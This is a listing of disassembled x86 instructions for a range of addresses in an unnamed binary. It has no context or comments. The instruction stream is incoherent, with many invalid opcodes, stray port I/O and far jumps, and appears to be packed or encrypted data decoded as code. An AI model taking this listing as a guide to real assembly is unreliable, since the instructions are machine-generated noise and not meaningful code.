  40c17b:	adc    al,0x12
  40c17d:	and    BYTE PTR [ecx+ebx*2-0x79],bl
  40c181:	retf   0xe20f
  40c184:	ret    0x7581
  40c187:	imul   ecx,DWORD PTR [esi],0x44d5720c
  40c18d:	and    ebp,DWORD PTR [ebp-0x5d]
  40c190:	xchg   BYTE PTR ds:0xf3044cbb,bh
  40c196:	mov    ds:0xbd5975b6,eax
  40c19b:	test   DWORD PTR [ebx-0x3b],0x8549ae1
  40c1a2:	jge    0x40c1b4
  40c1a4:	xchg   edi,eax
  40c1a5:	mov    fs,WORD PTR [ecx]
  40c1a7:	jle    0x40c1f9
  40c1a9:	or     edx,DWORD PTR [edx]
  40c1ab:	mov    ecx,0xe1e28163
  40c1b0:	dec    esi
  40c1b1:	mov    ds:0x4a09635b,al
  40c1b6:	idiv   DWORD PTR [ecx-0x2717926e]
  40c1bc:	scas   eax,DWORD PTR es:[edi]
  40c1bd:	pop    edx
  40c1be:	sbb    ch,BYTE PTR [ebp+0x5c9d8ff9]
  40c1c4:	punpcklbw mm6,DWORD PTR [edi-0x2e]
  40c1c8:	es into 
  40c1ca:	ret    0x639b
  40c1cd:	jg     0x40c228
  40c1cf:	or     eax,ecx
  40c1d1:	xor    eax,0x815bbd9d
  40c1d6:	pop    eax
  40c1d7:	add    dh,cl
  40c1d9:	ffree  st(3)
  40c1db:	xchg   edx,eax
  40c1dc:	jbe    0x40c20d
  40c1de:	aam    0xbc
  40c1e0:	int3   
  40c1e1:	repnz inc ecx
  40c1e3:	jge    0x40c18a
  40c1e5:	and    BYTE PTR [ebx+0x15fb34f3],dl
  40c1eb:	das    
  40c1ec:	jmp    0x40c1a7
  40c1ee:	or     bh,al
  40c1f0:	cmp    DWORD PTR [edx],ebx
  40c1f2:	or     DWORD PTR [eax],edi
  40c1f4:	xor    ebp,eax
  40c1f6:	(bad)  
  40c1f7:	fisttp QWORD PTR [ecx-0x1663dd51]
  40c1fd:	add    eax,0xc54b3211
  40c202:	jno    0x40c1f8
  40c204:	ss jg  0x40c254
  40c207:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c208:	pop    esi
  40c209:	mov    bh,0xe1
  40c20b:	ss call 0x634:0x7ae8b84b
  40c213:	retf   0x3d3b
  40c216:	out    dx,al
  40c217:	cmc    
  40c218:	fisttp QWORD PTR [ecx+0x1a51d711]
  40c21e:	mov    dl,0x4b
  40c220:	jp     0x40c29e
  40c222:	daa    
  40c223:	mov    edi,0x6a2e9827
  40c228:	das    
  40c229:	push   ebx
  40c22a:	jnp    0x40c21c
  40c22c:	in     al,dx
  40c22d:	cdq    
  40c22e:	out    0xda,al
  40c230:	jmp    0x40c2a3
  40c232:	(bad)  
  40c233:	repz mov dh,0x67
  40c236:	xchg   edx,eax
  40c237:	es adc eax,0xea03eac8
  40c23d:	int    0xbf
  40c23f:	jle    0x40c1f3
  40c241:	out    dx,eax
  40c242:	pop    esp
  40c243:	push   ebp
  40c244:	ins    BYTE PTR es:[edi],dx
  40c245:	fmul   DWORD PTR [ebp+0x60]
  40c248:	add    al,0x70
  40c24a:	cdq    
  40c24b:	jl     0x40c2bd
  40c24d:	add    DWORD PTR [edx],edi
  40c24f:	int    0x67
  40c251:	adc    bh,BYTE PTR [ecx]
  40c253:	adc    DWORD PTR [ebx-0x43],0x845fcddc
  40c25a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c25b:	cmp    al,0x92
  40c25d:	xchg   BYTE PTR [edi-0x15],bh
  40c260:	fst    QWORD PTR [ebx-0x21]
  40c263:	and    eax,0x1f24c1d3
  40c268:	aaa    
  40c269:	addr16 fwait
  40c26b:	pusha  
  40c26c:	jne    0x40c2bf
  40c26e:	and    eax,0xd0907a4a
  40c273:	xchg   esi,eax
  40c274:	and    al,0x50
  40c276:	mov    dh,0x19
  40c278:	mov    BYTE PTR [edi],dl
  40c27a:	pop    ebx
  40c27b:	inc    edi
  40c27c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c27d:	mov    ecx,0x683b2e4e
  40c282:	push   ecx
  40c283:	mov    eax,0x656fa7d2
  40c288:	cmp    edi,DWORD PTR [ecx]
  40c28a:	pop    es
  40c28b:	fadd   QWORD PTR [eax-0x6d6ab77f]
  40c291:	sbb    cl,ch
  40c293:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c294:	jns    0x40c21f
  40c296:	idiv   DWORD PTR [bp+si]
  40c299:	por    mm4,QWORD PTR [edi+0xf725774]
  40c2a0:	sub    eax,0x375e7b82
  40c2a5:	inc    edi
  40c2a6:	das    
  40c2a7:	bound  eax,QWORD PTR [esi-0x4a87e6c2]
  40c2ad:	ss mov DWORD PTR gs:[ebx+0x5626758a],ebx
  40c2b5:	rcr    BYTE PTR [edi],cl
  40c2b7:	daa    
  40c2b8:	mov    eax,ds:0x43d66a05
  40c2bd:	jb     0x40c2c5
  40c2bf:	xor    eax,esp
  40c2c1:	ss sbb al,0xa0
  40c2c4:	dec    eax
  40c2c5:	aaa    
  40c2c6:	dec    edi
  40c2c7:	or     DWORD PTR ds:0x8dae6b0a,edx
  40c2cd:	xor    BYTE PTR [esi+edx*1-0x516fa190],al
  40c2d4:	pop    ebx
  40c2d5:	aam    0x4
  40c2d7:	xchg   edx,eax
  40c2d8:	sub    BYTE PTR [ebx],dh
  40c2da:	retf   
  40c2db:	mov    ecx,0xf5ebe4b4
  40c2e0:	aad    0x78
  40c2e2:	mov    ch,BYTE PTR [edi+0x5a300bbc]
  40c2e8:	outs   dx,DWORD PTR ds:[esi]
  40c2e9:	fs sbb eax,0xa9e8f13
  40c2ef:	pop    ebp
  40c2f0:	add    ebx,DWORD PTR [ecx+esi*4+0x607a041a]
  40c2f7:	mov    dl,0xf6
  40c2f9:	dec    eax
  40c2fa:	sahf   
  40c2fb:	mov    ch,0x78
  40c2fd:	xor    cl,dl
  40c2ff:	mov    dl,0x17
  40c301:	mov    ds:0xd5e0fafc,eax
  40c306:	repz int3 
  40c308:	loop   0x40c2db
  40c30a:	push   edx
  40c30b:	xchg   DWORD PTR [edx],esi
  40c30d:	sub    BYTE PTR [esi-0x79bba54e],0x80
  40c314:	xchg   DWORD PTR [eax-0x74],ecx
  40c317:	mov    ebx,DWORD PTR [ebp-0x70bf0a55]
  40c31d:	and    BYTE PTR [ebp+edx*1-0x60],0xcf
  40c322:	dec    esp
  40c323:	or     al,0xdc
  40c325:	inc    DWORD PTR [edx]
  40c327:	jmp    0x72c0:0x2fca0bd
  40c32e:	pop    es
  40c32f:	fwait
  40c330:	and    DWORD PTR [edx],ecx
  40c332:	mov    esi,esp
  40c334:	jns    0x40c369
  40c336:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c337:	fist   DWORD PTR [esi+eax*1]
  40c33a:	clc    
  40c33b:	je     0x40c2be
  40c33d:	cmp    al,0x25
  40c33f:	out    dx,eax
  40c340:	or     bl,dl
  40c342:	scas   eax,DWORD PTR es:[edi]
  40c343:	jp     0x40c316
  40c345:	data16 adc al,0xf2
  40c348:	push   esp
  40c349:	mov    ds:0x357bfd85,eax
  40c34e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c34f:	stos   DWORD PTR es:[edi],eax
  40c350:	inc    edx
  40c351:	inc    eax
  40c352:	shr    DWORD PTR ds:0xf15932b9,1
  40c358:	mov    ds:0x62bff378,al
  40c35d:	retf   0xcddc
  40c360:	pop    ecx
  40c361:	xor    DWORD PTR [ebx+0x4b7b8c9a],ebp
  40c367:	mov    DWORD PTR cs:[eax-0x5de30bc8],ebx
  40c36e:	int    0x36
  40c370:	out    0x46,eax
  40c372:	pop    ds
  40c373:	ror    BYTE PTR [esi],0xdf
  40c376:	repz (bad) 
  40c378:	push   edx
  40c379:	ja     0x40c3bd
  40c37b:	stc    
  40c37c:	jne    0x40c39a
  40c37e:	dec    esp
  40c37f:	ja     0x40c387
  40c381:	mov    ebx,0xd9fa3e3e
  40c386:	sub    al,0x3d
  40c388:	call   0xb9c9fb80
  40c38d:	cld    
  40c38e:	mov    edx,DWORD PTR [ebp-0x5c]
  40c391:	xor    eax,edi
  40c393:	xor    edx,edx
  40c395:	or     eax,edx
  40c397:	mov    edx,DWORD PTR [ebp+0x14]
  40c39a:	shl    ecx,0x1e
  40c39d:	jmp    0x40c927
  40c3a2:	sbb    esp,edi
  40c3a4:	adc    eax,0x1913193b
  40c3a9:	aad    0x32
  40c3ab:	into   
  40c3ac:	sti    
  40c3ad:	mov    ah,0x71
  40c3af:	push   eax
  40c3b0:	sub    BYTE PTR [eax+0x44],ch
  40c3b3:	ficom  WORD PTR [esi]
  40c3b5:	push   ss
  40c3b6:	cmp    eax,0x6a161604
  40c3bb:	lock popf 
  40c3bd:	push   ds
  40c3be:	pop    esp
  40c3bf:	ror    al,cl
  40c3c1:	push   es
  40c3c2:	sub    BYTE PTR [edx+0x9],0x84
  40c3c6:	inc    ecx
  40c3c7:	fdivr  st,st(0)
  40c3c9:	jmp    0x9517dfec
  40c3ce:	cmp    al,BYTE PTR [edx+edx*1+0x66cce47e]
  40c3d5:	shl    DWORD PTR [ebx],0xca
  40c3d8:	add    dl,ah
  40c3da:	mov    bh,0xe9
  40c3dc:	gs pusha 
  40c3de:	xchg   edi,eax
  40c3df:	lods   eax,DWORD PTR ds:[esi]
  40c3e0:	mov    BYTE PTR [ebx],al
  40c3e2:	inc    ebp
  40c3e3:	xchg   DWORD PTR [ebx+0x7ef435e9],edx
  40c3e9:	and    al,0xb2
  40c3eb:	(bad)  
  40c3ed:	cli    
  40c3ee:	cmp    ebx,esi
  40c3f0:	xor    eax,0xe1243ab8
  40c3f5:	pop    ebx
  40c3f6:	cwde   
  40c3f7:	fisttp QWORD PTR [eax]
  40c3f9:	fild   WORD PTR [ebp-0x473be0a1]
  40c3ff:	xchg   ebp,eax
  40c400:	not    BYTE PTR [ecx]
  40c402:	sub    bl,BYTE PTR [eax-0x19]
  40c405:	(bad)  
  40c406:	push   0xcf554b7
  40c40b:	mov    esi,0x3dc0277d
  40c410:	hlt    
  40c411:	in     al,dx
  40c412:	pop    ds
  40c413:	pop    ebp
  40c414:	shl    cl,1
  40c416:	ror    DWORD PTR [edx+0x15],1
  40c419:	mov    al,0xce
  40c41b:	pop    ss
  40c41c:	jo     0x40c472
  40c41e:	xchg   DWORD PTR [eax+0x3a1e4f41],ecx
  40c424:	stc    
  40c425:	loope  0x40c47c
  40c427:	pop    es
  40c428:	shl    DWORD PTR [esi+0x25],1
  40c42b:	jle    0x40c3cb
  40c42d:	cmc    
  40c42e:	(bad)  
  40c42f:	clc    
  40c430:	dec    esp
  40c431:	shr    DWORD PTR [edi+0x2c6cb0dc],cl
  40c437:	sub    BYTE PTR [eax-0x752ea38c],bl
  40c43d:	xchg   BYTE PTR [edx+0x16],cl
  40c440:	shr    DWORD PTR [ecx-0x39],0xe4
  40c444:	pop    edx
  40c445:	xor    dh,BYTE PTR ds:0xf103c61a
  40c44b:	scas   al,BYTE PTR es:[edi]
  40c44c:	out    dx,eax
  40c44d:	lea    eax,[edx]
  40c44f:	push   es
  40c450:	rcl    bl,1
  40c452:	or     DWORD PTR [ecx-0x24ef5810],ecx
  40c458:	jnp    0x40c4c1
  40c45a:	fimul  WORD PTR gs:[edi-0x52]
  40c45e:	(bad)  
  40c45f:	loopne 0x40c4d7
  40c461:	xchg   edi,edi
  40c463:	out    0x2,al
  40c465:	popa   
  40c466:	ror    al,cl
  40c468:	jle    0x40c44b
  40c46a:	mov    gs,WORD PTR [edi-0x4a76501c]
  40c470:	push   edx
  40c471:	call   0x164:0x1f544f0b
  40c478:	and    bh,al
  40c47a:	stc    
  40c47b:	gs je  0x40c44f
  40c47e:	pop    edx
  40c47f:	xor    BYTE PTR [ecx],bh
  40c481:	fist   WORD PTR [eax+0x7]
  40c484:	clc    
  40c485:	sbb    cl,dl
  40c487:	xchg   esp,eax
  40c488:	dec    eax
  40c489:	pusha  
  40c48a:	pop    ebp
  40c48b:	push   ss
  40c48c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c48d:	out    0x91,al
  40c48f:	arpl   WORD PTR [ebx+esi*1+0x609c0e39],bx
  40c496:	push   0x16a9074d
  40c49b:	cmp    DWORD PTR [edx],edi
  40c49d:	mov    al,0xbf
  40c49f:	pushf  
  40c4a0:	xchg   ecx,eax
  40c4a1:	pop    ds
  40c4a2:	add    esi,DWORD PTR [ebx-0x6abe4da1]
  40c4a8:	push   ds
  40c4a9:	adc    DWORD PTR [edx+0x21],eax
  40c4ac:	not    DWORD PTR [ecx+0x4911dcc1]
  40c4b2:	sub    cl,0x12
  40c4b5:	in     eax,dx
  40c4b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4b7:	fidivr WORD PTR [esi-0x6786656f]
  40c4bd:	inc    ebx
  40c4be:	sbb    ch,bl
  40c4c0:	in     eax,dx
  40c4c1:	call   0x89a4:0xdfbd2762
  40c4c8:	sbb    DWORD PTR [ecx-0x60],ebx
  40c4cb:	xor    BYTE PTR [ecx],0x3
  40c4ce:	(bad)  
  40c4cf:	or     dl,BYTE PTR [ebp+0x4180d40f]
  40c4d5:	dec    edx
  40c4d6:	jne    0x40c4cd
  40c4d8:	test   DWORD PTR [edi],esi
  40c4da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4db:	imul   eax,ecx,0xffffffa4
  40c4de:	dec    edx
  40c4df:	push   edx
  40c4e0:	push   ebp
  40c4e1:	sub    eax,DWORD PTR [edx+0x5214cab8]
  40c4e7:	loope  0x40c4b3
  40c4e9:	aas    
  40c4ea:	inc    eax
  40c4eb:	mov    BYTE PTR [esi],ah
  40c4ed:	sbb    al,0xeb
  40c4ef:	cdq    
  40c4f0:	ins    DWORD PTR es:[edi],dx
  40c4f1:	out    dx,al
  40c4f2:	sar    DWORD PTR [ecx],cl
  40c4f4:	add    BYTE PTR [esi-0x24],bl
  40c4f7:	jns    0x40c52f
  40c4f9:	push   edx
  40c4fa:	ins    DWORD PTR es:[edi],dx
  40c4fb:	push   0xe
  40c4fd:	xor    al,0xc2
  40c4ff:	push   esi
  40c500:	test   eax,0x6863d5be
  40c505:	dec    ebx
  40c506:	ins    BYTE PTR es:[edi],dx
  40c507:	dec    edx
  40c508:	stos   DWORD PTR es:[edi],eax
  40c509:	or     eax,0x73e67a3
  40c50e:	xor    dh,BYTE PTR [edx-0x29c08f06]
  40c514:	mov    bh,0x47
  40c516:	clc    
  40c517:	sub    DWORD PTR [ebx],ebp
  40c519:	add    DWORD PTR [esp+0x72],ebx
  40c51d:	(bad)  
  40c51e:	cwde   
  40c51f:	ja     0x40c4f9
  40c521:	push   ss
  40c522:	push   esp
  40c523:	lods   al,BYTE PTR ds:[esi]
  40c524:	shl    bh,cl
  40c526:	leave  
  40c527:	hlt    
  40c528:	mov    esi,0xb0686968
  40c52d:	out    dx,eax
  40c52e:	xor    cl,BYTE PTR [ebx+ebx*1]
  40c531:	xchg   BYTE PTR [ebp+0x92358d4],dl
  40c537:	setae  BYTE PTR [edx-0x60]
  40c53b:	and    ecx,DWORD PTR [ebx+edi*8]
  40c53e:	dec    ebx
  40c53f:	push   es
  40c540:	mov    ecx,0x1c167fad
  40c545:	or     eax,DWORD PTR [eax+0x6f21a21]
  40c54b:	scas   al,BYTE PTR es:[edi]
  40c54c:	xchg   ebx,eax
  40c54d:	adc    dl,BYTE PTR [edi]
  40c54f:	mov    edx,0x3c66006e
  40c554:	in     eax,0x72
  40c556:	sub    eax,0x38f8bf41
  40c55b:	jge    0x40c5dc
  40c55d:	jne    0x40c5b6
  40c55f:	outs   dx,BYTE PTR ds:[esi]
  40c560:	and    eax,0x11e8d4c4
  40c565:	pop    ebx
  40c566:	mov    ah,0xad
  40c568:	jecxz  0x40c5e6
  40c56a:	out    0x8,al
  40c56c:	test   DWORD PTR [ebx],edx
  40c56e:	sbb    eax,0xe707ff71
  40c573:	mov    cl,0x8b
  40c575:	mov    bh,0x38
  40c577:	xchg   ebx,eax
  40c578:	fs xor eax,0x98994eff
  40c57e:	or     al,0x8a
  40c580:	mov    edi,0x12cb48a0
  40c585:	clc    
  40c586:	jae    0x40c5af
  40c588:	cmc    
  40c589:	pusha  
  40c58a:	push   es
  40c58b:	xchg   edi,eax
  40c58c:	ins    DWORD PTR es:[edi],dx
  40c58d:	push   eax
  40c58e:	cli    
  40c58f:	mov    bl,0x92
  40c591:	pop    ds
  40c592:	jne    0x40c580
  40c594:	jo     0x40c518
  40c596:	pop    ebx
  40c597:	gs cwde 
  40c599:	das    
  40c59a:	inc    esp
  40c59b:	jbe    0x40c524
  40c59d:	lds    ebp,FWORD PTR [eax]
  40c59f:	enter  0x7d8,0x56
  40c5a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5a4:	push   esp
  40c5a5:	add    BYTE PTR [edx+0x38],dl
  40c5a8:	xchg   edx,eax
  40c5a9:	mov    esp,ebx
  40c5ab:	test   BYTE PTR [eax],0x5f
  40c5ae:	imul   DWORD PTR ds:0x3d515c0f
  40c5b4:	xor    DWORD PTR [ecx+ebx*8-0x20],eax
  40c5b8:	repz sub bl,BYTE PTR [ecx+0x427e5c64]
  40c5bf:	pop    ds
  40c5c0:	enter  0x4f17,0x4d
  40c5c4:	push   esp
  40c5c5:	xchg   esi,eax
  40c5c6:	mov    ebx,DWORD PTR [edi+0x6d96fe56]
  40c5cc:	data16 or ch,BYTE PTR [edi+eax*8-0x7d99299f]
  40c5d4:	xchg   ecx,eax
  40c5d5:	not    BYTE PTR [esi-0x5ae7a6ce]
  40c5db:	add    ch,BYTE PTR [ecx-0x12]
  40c5de:	jecxz  0x40c5c5
  40c5e0:	(bad)  
  40c5e1:	out    0x1b,al
  40c5e3:	xchg   edi,eax
  40c5e4:	jo     0x40c63f
  40c5e6:	inc    ebx
  40c5e7:	idiv   DWORD PTR [esi]
  40c5e9:	inc    ebp
  40c5ea:	nop
  40c5eb:	sbb    al,bh
  40c5ed:	gs inc esi
  40c5ef:	xchg   edx,eax
  40c5f0:	fucomip st,st(7)
  40c5f2:	rcl    BYTE PTR [edi+0x534ae085],0x96
  40c5f9:	into   
  40c5fa:	add    dh,BYTE PTR [ebx+edi*8-0x1b62e26e]
  40c601:	pop    edx
  40c602:	inc    edi
  40c603:	out    dx,eax
  40c604:	or     eax,0xca15b01e
  40c609:	dec    ebx
  40c60a:	lods   al,BYTE PTR ds:[esi]
  40c60b:	push   eax
  40c60c:	test   edi,0x14ae0b8
  40c612:	inc    BYTE PTR [ebx]
  40c614:	jb     0x40c613
  40c616:	push   0xffffffca
  40c618:	or     al,BYTE PTR gs:[edi-0x7d]
  40c61c:	or     DWORD PTR [ecx],edi
  40c61e:	jns    0x40c5c7
  40c620:	(bad)  
  40c621:	jl     0x40c637
  40c623:	inc    edi
  40c624:	mov    edi,0xcba5adab
  40c629:	in     eax,dx
  40c62a:	test   DWORD PTR [esi-0x635d7298],edx
  40c630:	mov    esp,0x34472d0
  40c635:	mov    dh,BYTE PTR [edx-0x3ff62020]
  40c63b:	mov    ah,0xd2
  40c63d:	xchg   ecx,eax
  40c63e:	and    ch,bl
  40c640:	sbb    al,0x11
  40c642:	inc    ecx
  40c643:	test   BYTE PTR [ebx-0x79c4d4ec],bh
  40c649:	mov    dl,0x6
  40c64b:	(bad)  
  40c64c:	scas   al,BYTE PTR es:[edi]
  40c64d:	sbb    BYTE PTR [edi+0x7e],ah
  40c650:	cmp    al,0xf1
  40c652:	(bad)  
  40c653:	popf   
  40c654:	loopne 0x40c5fc
  40c656:	inc    ebx
  40c657:	in     eax,dx
  40c658:	ret    0xf1a0
  40c65b:	inc    esp
  40c65c:	ja     0x40c6d4
  40c65e:	fwait
  40c65f:	popf   
  40c660:	mov    ecx,0xba6335f6
  40c665:	dec    esi
  40c666:	rcl    BYTE PTR [ecx-0x640e11a8],cl
  40c66c:	pop    esi
  40c66d:	into   
  40c66e:	or     ebp,ecx
  40c670:	dec    eax
  40c671:	in     eax,0x5f
  40c673:	in     eax,dx
  40c674:	push   es
  40c675:	and    dl,BYTE PTR [ebp*1-0x703a0465]
  40c67c:	imul   ebx,ebx,0x56383de6
  40c682:	jne    0x40c6fd
  40c684:	pop    ds
  40c685:	clc    
  40c686:	and    al,0x99
  40c688:	pop    ebp
  40c689:	inc    DWORD PTR [ebx+eiz*4-0x6b]
  40c68d:	adc    eax,0xd79b356c
  40c692:	cmp    ebx,edx
  40c694:	aad    0x6e
  40c696:	and    edx,DWORD PTR ds:0xbe5b24bc
  40c69c:	mov    WORD PTR [edx+0xb],ds
  40c69f:	dec    ebx
  40c6a0:	pushw  0xad45
  40c6a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6a5:	ret    0x5842
  40c6a8:	out    dx,al
  40c6a9:	ins    BYTE PTR es:[edi],dx
  40c6aa:	jmp    eax
  40c6ac:	mov    DWORD PTR [edi-0x2e78745],esi
  40c6b2:	jne    0x40c695
  40c6b4:	ror    BYTE PTR [ecx],cl
  40c6b6:	xlat   BYTE PTR ds:[ebx]
  40c6b7:	hlt    
  40c6b8:	inc    edi
  40c6b9:	clc    
  40c6ba:	sub    al,0x2
  40c6bc:	inc    esi
  40c6bd:	outs   dx,DWORD PTR ds:[esi]
  40c6be:	jo     0x40c70c
  40c6c0:	repz sub al,0x35
  40c6c3:	jl     0x40c68d
  40c6c5:	(bad)  
  40c6c7:	and    BYTE PTR [ecx-0x243ae003],ch
  40c6cd:	and    esi,DWORD PTR [edi]
  40c6cf:	cmp    al,BYTE PTR [ebx+0x558ae33f]
  40c6d5:	pushf  
  40c6d6:	adc    al,0xf8
  40c6d8:	repnz out dx,eax
  40c6da:	mul    dh
  40c6dc:	sbb    BYTE PTR [eax],bh
  40c6de:	cmp    dh,BYTE PTR [eax]
  40c6e0:	sbb    DWORD PTR ds:0xb1f8dbe5,edx
  40c6e6:	in     al,dx
  40c6e7:	sbb    eax,0xe871db58
  40c6ec:	mov    ebp,0xe5012f1c
  40c6f1:	in     eax,0xb9
  40c6f3:	inc    ecx
  40c6f4:	stos   BYTE PTR es:[edi],al
  40c6f5:	je     0x40c766
  40c6f7:	out    dx,eax
  40c6f8:	mov    DWORD PTR [esp+eiz*4-0x27315382],esi
  40c6ff:	xor    ah,BYTE PTR [ebx+0x5d6df7c5]
  40c705:	jbe    0x40c742
  40c707:	mov    ds:0xec1def0d,eax
  40c70c:	es push ebp
  40c70e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c70f:	jno    0x40c6d9
  40c711:	pop    esi
  40c712:	popa   
  40c713:	cs jmp 0x40c6ad
  40c716:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c717:	mov    edi,0xe0fbd38e
  40c71c:	push   ss
  40c71d:	adc    al,0xc7
  40c71f:	shl    BYTE PTR [eax-0x6dfa48c1],1
  40c725:	nop
  40c726:	inc    edx
  40c727:	inc    esi
  40c728:	xchg   ecx,eax
  40c729:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c72a:	and    al,0x1d
  40c72c:	loopne 0x40c74d
  40c72e:	iret   
  40c72f:	sti    
  40c730:	xor    BYTE PTR [edx+0x3f],dl
  40c733:	pop    ecx
  40c734:	cld    
  40c735:	call   FWORD PTR [eax+ebx*4]
  40c738:	fsub   DWORD PTR [ecx-0x5b18088d]
  40c73e:	jns    0x40c7b8
  40c740:	int    0x3d
  40c742:	xchg   BYTE PTR [edi],dl
  40c744:	dec    ecx
  40c745:	add    dl,BYTE PTR [eax+0x15]
  40c748:	mov    dl,0x8f
  40c74a:	or     BYTE PTR [eax-0x540618da],bh
  40c750:	inc    ebp
  40c751:	mov    bl,0x63
  40c753:	add    eax,0x2bc6ead0
  40c758:	adc    DWORD PTR ds:0xf144b621,0xffffff82
  40c75f:	lods   eax,DWORD PTR ds:[esi]
  40c760:	sar    BYTE PTR [edi],0xf0
  40c763:	nop
  40c764:	sbb    BYTE PTR [eax-0xe],ah
  40c767:	mov    edx,DWORD PTR [esi]
  40c769:	sbb    DWORD PTR [ecx+edx*4+0x53],ebx
  40c76d:	in     al,dx
  40c76e:	mov    cl,0x56
  40c770:	adc    DWORD PTR [ebx],edi
  40c772:	sub    eax,0x68bddd3d
  40c777:	shr    DWORD PTR [esi-0x3bccd363],1
  40c77d:	or     eax,0xc10e1340
  40c782:	and    DWORD PTR [ebp-0x6c],0xa939986
  40c789:	mov    eax,ds:0x43c08d05
  40c78e:	test   BYTE PTR [eax-0xce550ab],cl
  40c794:	test   al,0xdc
  40c796:	bound  ecx,QWORD PTR [edx+0x7a]
  40c799:	(bad)  
  40c79a:	mov    eax,0xd519d001
  40c79f:	dec    esi
  40c7a0:	(bad)  
  40c7a1:	mov    eax,ds:0x7f51dc1e
  40c7a6:	dec    esp
  40c7a7:	dec    ecx
  40c7a8:	mov    dh,0x63
  40c7aa:	rcr    BYTE PTR [edi+0x58],cl
  40c7ad:	mov    al,0xdd
  40c7af:	aam    0xe3
  40c7b1:	jb     0x40c752
  40c7b3:	into   
  40c7b4:	lods   eax,DWORD PTR ds:[esi]
  40c7b5:	and    esi,0x3a
  40c7b8:	push   ebx
  40c7b9:	add    DWORD PTR [edi+ecx*4],ecx
  40c7bc:	cli    
  40c7bd:	sbb    BYTE PTR [esi],ah
  40c7bf:	enter  0xdc5,0x96
  40c7c3:	fs scas al,BYTE PTR es:[edi]
  40c7c5:	mov    ecx,0x284be349
  40c7ca:	dec    eax
  40c7cb:	or     DWORD PTR [edx+ecx*1-0x75],esp
  40c7cf:	pop    ss
  40c7d0:	fmul   DWORD PTR [esi]
  40c7d2:	add    DWORD PTR [esi],esp
  40c7d4:	jp     0x40c796
  40c7d6:	mov    ch,0x79
  40c7d8:	or     BYTE PTR [esp+esi*1],ch
  40c7db:	fild   WORD PTR [edx-0x73]
  40c7de:	pop    edx
  40c7df:	scas   eax,DWORD PTR es:[edi]
  40c7e0:	jne    0x40c7f2
  40c7e2:	test   cl,ch
  40c7e4:	inc    esi
  40c7e5:	lods   al,BYTE PTR ds:[esi]
  40c7e6:	sbb    cl,BYTE PTR [ebp-0x7841eb4b]
  40c7ec:	dec    ecx
  40c7ed:	dec    ebx
  40c7ee:	jmp    0x40c82c
  40c7f0:	dec    edx
  40c7f1:	mov    cl,0x7d
  40c7f3:	fs hlt 
  40c7f5:	mov    eax,edx
  40c7f7:	fstp   QWORD PTR [edi+edi*4]
  40c7fa:	mov    sp,di
  40c7fd:	mov    ecx,0x2828de85
  40c802:	jo     0x40c876
  40c804:	sbb    BYTE PTR [esi+0x5c],dh
  40c807:	scas   al,BYTE PTR es:[edi]
  40c808:	out    0x58,al
  40c80a:	xor    esi,edx
  40c80c:	(bad)  
  40c80e:	daa    
  40c80f:	jmp    0x82b1:0x271ef6ed
  40c816:	pop    eax
  40c817:	retf   
  40c818:	push   es
  40c819:	mov    bl,0xdc
  40c81b:	push   edi
  40c81c:	mov    edi,0xde5f515d
  40c821:	cmp    DWORD PTR [ebp+0xdf003ad],0x5efacdab
  40c82b:	dec    ax
  40c82d:	iret   
  40c82e:	mov    esi,DWORD PTR [ebp-0x5f7684ee]
  40c834:	mov    esp,0x320f2159
  40c839:	mov    ebx,0xfde817b
  40c83e:	cwde   
  40c83f:	loop   0x40c84a
  40c841:	mov    ah,0xf
  40c843:	inc    ecx
  40c844:	sub    DWORD PTR [ebx+0x12],0x4d
  40c848:	and    DWORD PTR [edx-0x49],ecx
  40c84b:	mov    cl,BYTE PTR [edi]
  40c84d:	lea    edi,[eax+0x73]
  40c850:	jmp    0xfba7:0xe9bec826
  40c857:	jae    0x40c8a4
  40c859:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c85a:	xlat   BYTE PTR fs:[ebx]
  40c85c:	jl     0x40c7e8
  40c85e:	and    eax,0x8d9738f3
  40c863:	push   0x30ba81f8
  40c868:	jae    0x40c838
  40c86a:	(bad)  
  40c86b:	mov    bh,0xc5
  40c86d:	mov    dh,0x7
  40c86f:	ret    
  40c870:	add    eax,DWORD PTR [eax]
  40c872:	cmovp  edi,DWORD PTR [edi-0x21c832bd]
  40c879:	les    eax,FWORD PTR [eax+0x1b655227]
  40c87f:	in     al,0xfa
  40c881:	out    0x8e,al
  40c883:	ds push es
  40c885:	and    BYTE PTR [ecx],ah
  40c887:	xor    bx,WORD PTR [ebp-0x5212693d]
  40c88e:	push   edx
  40c88f:	cld    
  40c890:	iret   
  40c891:	faddp  st(7),st
  40c893:	push   ecx
  40c894:	(bad)  
  40c895:	call   0x9df26d7
  40c89a:	call   0xbc22:0x37f77dcc
  40c8a1:	pushf  
  40c8a2:	dec    esp
  40c8a3:	pusha  
  40c8a4:	cld    
  40c8a5:	fnstsw WORD PTR [esi+0x5c]
  40c8a8:	inc    ecx
  40c8a9:	test   al,0xe8
  40c8ab:	sub    cl,BYTE PTR [eax-0x27]
  40c8ae:	xlat   BYTE PTR ds:[ebx]
  40c8af:	dec    esp
  40c8b0:	inc    ecx
  40c8b1:	mov    ds:0xddaecd03,eax
  40c8b6:	mov    eax,ds:0xac71dad5
  40c8bb:	daa    
  40c8bc:	push   ecx
  40c8bd:	mov    ebp,0x14d6741c
  40c8c2:	cmp    BYTE PTR [edi],0x47
  40c8c5:	sti    
  40c8c6:	sbb    ah,BYTE PTR [edx+edx*4]
  40c8c9:	adc    eax,0xc616b37e
  40c8ce:	xchg   ecx,eax
  40c8cf:	adc    ecx,DWORD PTR [ebx+edi*4]
  40c8d2:	arpl   WORD PTR [ecx],si
  40c8d4:	xchg   ebx,eax
  40c8d5:	jg     0x40c8f5
  40c8d7:	dec    edx
